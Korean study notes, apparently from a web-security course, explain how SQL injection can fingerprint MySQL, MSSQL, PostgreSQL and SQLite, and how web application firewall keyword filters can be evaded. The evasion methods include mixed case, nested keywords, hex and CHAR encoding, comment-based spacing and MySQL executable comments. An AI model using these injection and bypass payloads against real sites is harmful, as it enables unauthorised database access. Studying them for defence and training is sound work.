* SQL Injection 발생 상황별로 DBMS를 파악하는 방법
    - 쿼리 실행 결과 출력
        + 애플리케이션에서 삽입한 쿼리의 실행 결과를 출력한다면 **DBMS에서 지원하는 환경 변수의 값**을 이용할 수 있음
            - DBMS 별로 버전을 나타내는 함수 및 데이터가 다르다는 점을 이용함
        + 예시: DBMS에서 제공하는 환경 변수와 함수를 사용해 버전을 확인하는 쿼리문
            ```sql
            SELECT @@version;
            SELECT version();
            ```
    - 에러 메시지 출력
        + 삽입할 쿼리를 애플리케이션에서 실행하면서 에러 메시지를 출력하는 경우 **에러 메시지를 이용하여 사용하는 DBMS를 알아낼 수 있음**
        + 예시: 잘못된 쿼리를 삽입하여 에러 메시지를 출력시키는 경우
            ```sql
            -- 컬럼의 수가 일치하지 않으면, UNION 구문은 에러를 발생시킴
            SELECT 1 UNION SELECT 1, 2;
            /* 출력 결과
                MySQL) ERROR 1222 (21000): The used SELECT statements have a different number of columns (SELECT * FROM not_exists_table)
                                ↳ 이 에러코드는 MySQL에서만 사용되므로 이를 통해 DBMS의 정보가 노출됨
                SQLite) Error: no such table: not_exists_table
            */
            ```
    - 참 또는 거짓 출력
        + 애플리케이션에서 쿼리 실행 결과가 아닌 **참과 거젓 여부만을 출력**할 경우 **Blind SQL Injection 공격**으로 사용 중인 DBMS 정보를 알아낼 수 있음
        + 예시: Blind SQL Injection 기법을 이용한 쿼리문 중 일부(함수부분)
            ```sql
            -- 버전 환경 변수 및 함수를 통해 가져온 버전을 한 바이트씩 비교해 알아냄
            MID(@@version, 1, 1) = '5';
            SUBSTR(version(), 1, 1) = 'P';
            ```
    - 예외 상황
        + 애플리케이션에서 쿼리와 관련된 어떠한 결과도 출력하지 않는 경우 **시간 지연 함수**인 ```SLEEP```을 사용함
            - 일부 DBMS에서는 ```SLEEP``` 함수를 지원하지 않음 → 시스템에 맞는 시간 지연 함수를 사용해야 함
        + 예시: 시간 지연 함수를 이용함
            ```sql
            SLEEP(10) -- MySQL를 사용함
            pg_sleep(10) -- PostgreSQL를 사용함
            ```

<br/>

* DBMS Fingerprinting: **MySQL**
    - 쿼리 실행 결과 출력: *version*
        + ```@@version```(환경변수) 또는 ```version()```(함수)를 사용해 MySQL DBMS의 버전과 운영체제 정보를 알아낼 수 있음
            ```sql
            SELECT @@version;
            SELECT version();
            -- 출력 결과 예시: 5.7.29-0ubuntu0.16.04.1 → MySQL 버전은 5.7.29이고, 운영체제는 ubuntu (16.04.1)임을 알 수 있음
            ```
    - 에러 메시지 출력: *error*
        + ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 에러 메시지에 포함된 에러 코드로 DBMS가 MySQL임을 알 수 있음
            ```sql
            SELECT 1 UNION SELECT 1, 2; -- UNION 문의 컬럼 개수가 일치하지 않으면 에러를 발생시킨다는 점을 이용하여 에러를 발생시킴
            -- ERROR 1222 (21000): The used SELECT statements have a different number of columns
            ```
    - 참 또는 거짓 출력: *Blind*
        + ```version``` 환경변수의 값의 각 위치에 해당하는 문자를 ```MID``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
            ```sql
            -- @@version의 내용: '5.7.29-0ubuntu0.16.04.1'
            -- MID(@@version, 1, 1) → version 환경변수의 첫 번째 문자: '5'

            SELECT MID(@@version, 1, 1) = '5'; -- @@version의 첫 번째 문자가 4인지 확인 → 1(True)
            SELECT MID(@@version, 1, 1) = '6'; -- @@version의 첫 번째 문자가 5인지 확인 → 0(False)
            ```
    - 예외 상황: *Time based*
        + 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```SLEEP``` 함수를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
            ```sql
            -- MID(@@version, 1, 1) → version 환경 변수의 첫 번째 문자: '5'
            SELECT MID(@@version, 1, 1) = '5' AND SLEEP(2); -- AND 앞의 식이 참이므로 SLEEP(2)가 실행되어 2초 지연됨 (시간 지연 밸생)
            SELECT MID(@@version, 1, 1) = '6' AND SLEEP(2); -- AND 앞의 식이 거짓이므로 뒤의 식도 실행되지 않음 (시간 지연 미발생) 
            ```

<br/>

* DBMS Fingerprinting: **MSSQL**
    - 쿼리 실행 결과 출력: *version*
        + ```@@version```(환경변수)를 이용해 DBMS의 버전과 운영체제 정보를 알아낼 수 있음
            ```sql
            SELECT @@version;
            /* 출력 결과 예시
                Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64) → 사용하고 있는 DBMS의 종류와 버전
                    Nov 30 2018 12:57:58 
                    Copyright (C) 2017 Microsoft Corporation
                    Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS) → 현재 DBMS가 운영되고 있는 운영체제의 정보
            */
            ```
    - 에러 메시지 출력: *error*
        + ```UNION``` 문으로 에러 메시지를 출력한 다음, 에러 메시지에 포함된 키워드로 MSSQL에서 출력된 문자열임을 알 수 있음
            ```sql
            SELECT 1 UNION SELECT 1, 2; -- UNION문의 컬럼 개수가 일치하지 않으면 에러를 발생시킨다는 점을 이용함
            /* 출력 결과 예시
                All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
            */
            ```
    - 참 또는 거짓 출력: *Blind*
        + ```@@version```(환경변수)에서 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTRING``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
            ```sql
            -- @@version의 내용: 'Microsoft SQL Server 2017 ...'
            -- SUBSTRIG(@@version, 1, 1) → version 환경변수의 첫 번째 문자 = 'M'

            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'M'; -- @@version의 첫 번째 문자가 'M'인지 확인 → 1을 출력함 (True)
            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'N'; -- @@version의 첫 번째 문자가 'N'인지 확인 → 아무것도 출력하지 않음 (False)
            ```
    - 예외 상황: *Time based*
        + 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```WAITFOR DELAY```를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
            ```sql
            -- SUBSTRIG(@@version, 1, 1) → version 환경변수의 첫 번째 문자 = 'M'
            
            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'M' AND WAITFOR DELAY '0:0:5'; -- AND 앞의 식이 참이므로 WAITFOR DELAY가 실행되어 5초 지연됨
            SELECT 1 FROM test WHERE SUBSTRING(@@version, 1, 1) = 'N' AND WAITFOR DELAY '0:0:5'; -- AND 앞의 식이 거짓이므로 WAITFOR DELAY는 실행되지 않음 (지연 미발생)
            ```
        + 헤비 쿼리를 이용할 수도 있음
            ```sql
            SELECT (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F);
            ```

<br/>

* DBMS Fingerprinting: **PostgreSQL**
    - 쿼리 실행 결과 출력: *version*
        + ```version``` 함수를 사용해 DBMS의 상세 정보와 운영체제 정보를 알아낼 수 있음
            ```sql
            SELECT version();
            /* 출력 결과: 
                PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
                (1 row) 
            */
            ```
    - 에러 메시지 출력: *error*
        + ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 에러 메시지에 포함된 키워드로 PostgreSQL에서 출력된 문자열임을 검색을 통해 확인할 수 있음
            ```sql
            SELECT 1 UNION SELECT 1, 2; -- UNION 문은 컬럼의 개수가 같지 않다면 에러를 발생시킴
            -- ERROR: each UNION query must have the same number of columns
            ```
    - 참 또는 거짓 출력: *Blind*
        + ```version``` 함수로 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTR``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
            ```sql
            -- version() 함수 출력 결과: 'PostgreSQL 12.2 ...'
            -- SUBSTR(version(), 1, 1) → version() 함수의 첫 번째 문자: 'P'

            SELECT SUBSTR(version(), 1, 1) = 'P'; -- version()의 첫 번째 문자가 'P'인지 확인 → t (참)
            SELECT SUBSTR(version(), 1, 1) = 'Q'; -- version()의 첫 번째 문자가 'Q'인지 확인 → f (거짓)
            ```
    - 예외 상황: *Time based*
        + 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 ```pg_sleep``` 함수를 사용하여 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
            ```sql
            -- SUBSTR(version(), 1, 1) → version() 함수의 첫 번째 문자: 'P'
            SELECT SUBSTR(version(), 1, 1) = 'P' AND pg_sleep(10); -- AND 앞의 식이 참이므로 pg_sleep(10)이 실행되어 10초 지연됨 (시간 지연 발생)
            SELECT SUBSTR(version(), 1, 1) = 'Q' AND pg_sleep(10); -- AND 앞의 식이 거짓이므로 뒤의 식도 실행되지 않음 (시간 지연 미발생)
            ```

<br/>

* DBMS Fingerprinting: **SQLite**
    - 쿼리 실행 결과 출력: *version*
        + ```sqlite_version``` 함수를 이용해 DBMS의 버전을 알아낼 수 있음
            ```sql
            SELECT sqlite_version();
            -- 출력 결과(예시): 3.11.0 → 실행 중인 SQLite 버전 정보를 반환함
            ```
    - 에러 메시지 출력: *error*
        + ```UNION``` 문으로 에러 메시지를 출력시킨 다음, 포함된 키워드로 SQLite에서 출력된 문자열임을 검색을 통해 확인할 수 있음
            ```sql
            SELECT 1 UNION SELECT 1, 2; -- UNION 문은 컬럼의 개수가 같지 않다면 에러를 발생시킴
            -- ERROR: SELECTs to the left and right of UNION do not have the same number of result columns
            ```
    - 참 또는 거짓 출력: *Blind*
        + ```sqlite_version``` 함수로 가져온 버전의 각 위치에 해당하는 문자를 ```SUBSTR``` 함수를 통해 Blind SQL Injection으로 알아낼 수 있음
            ```sql
            -- sqlite_version() 함수 실행 결과: '3.11.0'
            -- SUBSTR(sqlite_version(), 1, 1) → sqlite_version()의 첫 번째 문자: '3'

            SELECT SUBSTR(sqlite_version(), 1, 1) = '3'; -- sqlite_version()의 첫 번째 문자가 '3'인지 확인 → 1 (참)
            SELECT SUBSTR(sqlite_version(), 1, 1) = '4'; -- sqlite_version()의 첫 번째 문자가 '4'인지 확인 → 0 (거짓)
            ```
    - 예외 상황: *Time based*
        + 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때 시간 지연 발생 여부로 그 결과를 알아낼 수 있음
            ```sql
            -- 조건식(WHEN 다음의 비교식)의 결과가 참이라면 LIKE(...)를, 아니면 1=1을 실행함
            SELECT CASE WHEN substr(sqlite_version(), 1, 1) = '3' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1=1 END;
            ```

<br/><br/>

### Exploit Tech: WAF Bypass
* Background: **Web Application Firewall**(WAF)
    - 웹 어플리케이션에 특화된 방화벽 (= 웹 방화벽)
        + 공격에 사용되었던 코드, 즉 **주요 키워드**를 기반으로 탐지함 <br/> &nbsp;&nbsp; → ⚠️ 키워드를 이용해 탐지하는 방식은 공격의 리소스를 증가시키지만, 근본적인 취약점을 해결할 수 없다는 한계가 존재함
        + 방화벽에 적용된 웹 서비스에서는 SQL Injection 취약점이 발생하더라도 공격을 최소화할 수 있음
            - *취약점은 여전히 존재하는 상태이기 때문에 SQL 문을 조작하여 방화벽을 우회하고 공격할 수 있음*
    - 웹 방화벽의 장﹒단점
        | | 설명 |
        |:---:|------|
        | 장점 | 취약점을 이용한 공격의 피해를 **최소화**함 <br/> &nbsp;&nbsp; - 알려진 공격 키워드를 탐지, 과도한 트래픽이 발생할 경우 트래픽 과부하가 발생하는 IP를 차단하여 공격을 더 이상 진행하지 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 못하도록 막음 |
        | 단점 | 단순한 공격을 막기 위해 방화벽을 도입한다면 가용성 침해, 비용 낭비 등이 발생할 수 있다는 단점이 있음 <br/> &nbsp;&nbsp; - 방화벽을 도입하기 위해서는 보호가 필요한 서버를 지정하고, 서비스에서 발생하는 트래픽의 용량을 측정하는 등의 과정이 필요함 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ 시간과 비용이 발생함 |

<br/>

* 탐지 우회 방법
    - 대소문자 검사 미흡
        + SQL은 데이터베이스의 컬럼명을 포함해 질의문의 **대소문자를 구분하지 않고 실행함**
            | 상황 | 설명 |
            |:---:|------|
            | 대문자 키워드만 필터링 | **소문자 키워드**를 사용해 필터링을 우회할 수 있음 |
            | 소문자, 대문자 키워드를 각각 필터링 | **대소문자를 혼용**하여 필터링을 우회할 수 있음 |
        + 대소문자 검사가 미흡한 경우의 탐지 우회 예시
            ```sql
            -- 방화벽에서 "UNION"만 필터링하는 경우
            SELECT 1 union SELECT 1, 2, 3; -- 소문자 키워드를 이용하여 필터링을 우회할 수 있음

            -- 방화벽에서 "UNION", "union"을 필터링하는 경우
            SELECT 1 UnIoN SELECT 1, 2, 3; -- 대소문자를 혼용하여 필터링을 우회할 수 있음
            ```
    - 탐지 과정 미흡
        + 방화벽에서 악성 키워드를 탐지했을 때 악성 키워드가 포함된 요청을 거부하거나 **내부에서 치환 과정을 거친 후 요청을 처리**할 수도 있음 
            - 방화벽에서 특정 키워드를 탐지하여 **공백으로 치환**할 경우 키워드 내부에 키워드를 **중첩하여 작성**하는 방법으로 이를 우회할 수 있음
        + 탐지 과정이 미흡한 경우의 탐지 우회 예시
            ```sql
            -- 방화벽에서 "UNION", "union"을 탐지하여 이를 공백으로 치환할 경우 (단, 검사는 반복해서 수행하지 않음)
            SELECT 1 UNunionION SELECT 1, 2, 3; -- 결과: SELECT 1 UNION SELECT 1, 2, 3; (필터링 결과로 쿼리문이 완성되어 내부에서 정상적으로 처리됨)
            ```
    - 문자열 검사 미흡
        + 일반적인 상황에서 "admin"이라는 문자열을 사용하는 경우는 많지 않기 때문에 방화벽에서 "admin" 키워드의 포함 여부를 검사함
            - 방화벽에서 특정 키워드를 탐지하는 경우 해당 문자열을 **뒤집거나 이어붙이거나 16진수로 표현**하는 등의 방법으로 이를 우회할 수 있음
        + 문자열 검사가 미흡한 경우의 탐지 우회 예시
            ```sql
            -- 방화벽에서 "admin" 키워드를 탐지하는 경우
            SELECT REVERSE('nimda'); -- REVERSE 함수 결과로 주어진 문자열이 뒤집히면 'admin'이 되므로 필터링을 우회할 수 있음
            SELECT CONCAT('adm', 'in'); -- CONCAT 함수 결과로 주어진 문자열이 합쳐져서 'admin'을 완성하므로 필터링을 우회할 수 있음
            SELECT x'61646d696e', 0x61646d696e; -- 'admin'을 16진수로 변환한 값인 '61646d696e'이 내부에서 'admin'으로 처리되어 필터링을 우회할 수 있음
            ```
    - 연산자 검사 미흡
        + 일반 이용자의 입력값에는 연산자가 필요하지 않으므로 방화벽에서 "AND", "OR"와 같은 연산자 키워드의 포함 여부를 검사함
            - 방화벽에서 연산자 키워드를 탐지할 경우 **연산자를 의미하는 기호 등으로 바꿔서 입력**하면 이를 우회할 수 있음
            - ^, =, !=, %, /, *, &, &&, |, ||, >, <, XOR, DIV, LIKE, RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL 등의 연산자를 사용할 수 있음
        + 연산자 검사가 미흡한 경우의 탐지 우회 예시
            ```sql
            -- 방화벽에서 "AND", "OR" 연산자 키워드의 포함 여부를 검사하는 경우
            SELECT 1 && 1; -- AND 키워드를 의미하는 기호인 &&을 사용하여 필터링을 우회함
            SELECT 1 || 1; -- OR 키워드를 의미하는 기호인 ||을 사용하여 필터링을 우회함
            ```
    - 공백 탐지 미흡
        + 공백을 허용하는 경우 공격자가 SQL Injection을 통해 다양한 함수와 또 다른 쿼리를 삽입해 의도하지 않은 결과가 나타날 수 있으므로 공백 문자가 필요하지 않는 경우에 이를 검사함
            - 방화벽에서 공백 문자를 검사하는 경우 **주석**이나 **Back Quote** 등을 이용해 이를 우회할 수 있음
        + 공백 문자 탐지가 미흡한 경우의 탐지 우회 예시
            ```sql
            -- 방화벽에서 공백 문자 포함 여부를 검사하는 경우
            SELECT/**/'abc'; -- SELECT 구문과 'abc' 문자열 사이에 주석을 나타내는 /**/를 삽입해 공백을 대신함
            SELECT`username`,(password)FROM`users`WHERE`username`=`admin`; -- Back Quote(`)를 사용해 공백 없이 쿼리를 실행시킬 수 있음
            ```

<br/>

* WAF Bypass: **MySQL**
    - 문자열 검사 우회
        + 문자열 검사 우회 시 사용할 수 있는 MySQL 함수
            | 함수 | 설명 |
            |:---:|------|
            | ```CHAR``` 함수 | ```CHAR(N, ...)``` 형식 <br/> &nbsp;&nbsp; - 각 인수 ```N```을 정수로 해석하고, 해당 함수의 코드 값으로 지정된 문자로 구성된 문자열을 반환함 |
            | ```CONCAT``` 함수 | ```CONCAT(str1, str, ...)``` 형식 <br/> &nbsp;&nbsp; - 인수로 주어진 문자열을 연결한 결과 문자열을 반환함 |
            | ```MID``` 함수 | ```MID(str, pos, len)``` 형식 <br/> &nbsp;&nbsp; - ```str```에서 ```pos``` 위치에서 시작해 ```len```만큼 자른 하위 문자열을 반환함 |
            + 문자열 검사 우회 예시
                ```sql
                SELECT 0x6162, 0b110000101100010; -- 결과: ab (16진수, 2진수를 이용해 문자열 ab를 표현함)

                SELECT CHAR(0x61, 0x62); -- 결과: ab
                SELECT CONCAT(CHAR(0x61), CHAR(0x62)); -- 결과: ab

                SELECT MID(@@version, 12, 1); -- 결과: n 
                ```
    - 공백 검사 우회
        + MySQL에서는 **개행과 주석**을 이용해 공백 검사를 우회할 수 있음
        + 공백 검사 우회 예시
            ```sql
            SELECT
            1; -- 결과: 1 (개행을 이용해 공백 검사를 우회할 수 있음)

            SELECT/**/1; --결과: 1 (주석 /**/를 이용해 공백 검사를 우회할 수 있음)
            ```
    - 주석 구문 실행: *Common Execute*
        + 📌 ***WAF에서는 ```/* ... */```을 주석으로 인식하고 쿼리 구문으로 인식하지 않음*** <br/> &nbsp;&nbsp; → MySQL Server에서 제공하는 기능 중 **```/*! MySQL specific code */```**는 주석 내 구문을 분석하고, 이를 쿼리의 일부로 수행함 <br/> &nbsp;&nbsp; ⇒ WAF를 우회하고 MySQL에서 임의의 쿼리를 실행할 수 있음
        + 주석 구문 실행 예시
            ```sql
            SELECT 1 /*!UNION*/ SELECT 2; -- /*! ... */ 안의 UNION을 쿼리의 일부로 수행함
            /* 결과
                1
                2
            */
            ```


<br/>

* WAF Bypass: **MSSQL**
    - 문자열 검사 우회
        + 문자열 검사 우회 시 사용할 수 있는 MSSQL 함수
            | 함수 | 설명 |
            |:---:|------|
            | ```CHAR``` 함수 | ```CHAR(integer_expression)``` 형식 <br/> &nbsp;&nbsp; - 0에서 255 사이의 정수를 입력받아 현재 데이터베이스의 기본 데이터 정렬 문자 집합 및 인코딩에 정의된 대로<br/> &nbsp;&nbsp;&nbsp;&nbsp; 지정된 정수 코드를 사용하는 싱글 바이트 문자를 반환함 |
            | ```CONCAT``` 함수 | ```CONCAT(string_value1, string_value2[, ..., string_valueN])``` 형식 <br/> &nbsp;&nbsp; - 둘 이상의 ```string_value``` 인수를 연결한 문자열을 반환함 |
            | ```SUBSTRING``` 함수 | ```SUBSTRING(expression, start, length)``` 형식 <br/> &nbsp;&nbsp; - ```expression```에서 ```start``` 위치부터 ```length``` 길이만큼 자른 문자열을 반환함 |
        + 문자열 검사 우회 예시
            ```sql
            SELECT CHAR(0x61); -- 결괴: a
            SELECT CONCAT(CHAR(0x61), CHAR(0x62)); -- 결과: ab
            SELECT SUBSTRING(@@version, 134, 1); -- 결과: n
            ```
    - 공백 검사 우회
        + MSSQL에서는 **개행과 주석**을 이용해 공백 검사를 우회할 수 있음
        + 공백 검사 우회 예시
            ```sql
            SELECT
            1; -- 결과: 1 (개행을 이용해 공백 검사를 우회할 수 있음)

            SELECT/**/1; -- 결과: 1 (주석 /**/를 이용해 공백 검사를 우회할 수 있음)
            ```

<br/>

* WAF Bypass: **PostgreSQL**
    - 문자열 검사 우회
        + 문자열 검사 우회 시 사용할 수 있는 PostgreSQL 함수
            | 함수 | 설명 |
            |:---:|------|
            | ```CHR``` 함수 | ```CHR(num)``` 형식 <br/> &nbsp;&nbsp; - ```num```(ASCII 코드 또는 UTF8로 변환되는 정수)를 입력 받아 ASCII 코드 값 또는 유니코드 코드포인트에 해당하는 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 값을 반환함 |
            | ```CONCAT``` 함수 | ```CONCAT(str_1, str_2, ...)``` 형식 <br/> &nbsp;&nbsp; - 문자열로 변환할 수 있는 인수 목록을 받아 이를 연결하여 하나의 문자열을 반환함 |
            | ```SUBSTRING``` 함수 | ```SUBSTRING(string, start_position, length)``` 형식 <br/> &nbsp;&nbsp; - ```string```에서 ```start_position``` 위치부터 ```length```만큼 자른 문자열을 반환함 |
        + 문자열 검사 우회 예시
            ```sql
            SELECT CHR(65); -- 결과: A
            SELECT CONCAT(CHR(65), CHR(66)); -- 결과: AB
            SELECT SUBSTRING(version(), 23, 1); -- 결과: n
            ```
    - 공백 검사 우회
        + PostgreSQL에서는 **개행과 주석**을 이용하여 공백 검사를 우회할 수 있음
        + 공백 검사 우회 예시
            ```sql
            SELECT
            1; -- 결과: 1 (SELECT 다음의 개행으로 공백 검사를 우회함)

            SELECT/**/1; -- 결과: 1 (주석 /**/를 이용해 공백 검사를 우회함)
            ```

<br/>

* WAF Bypass: **SQLite**
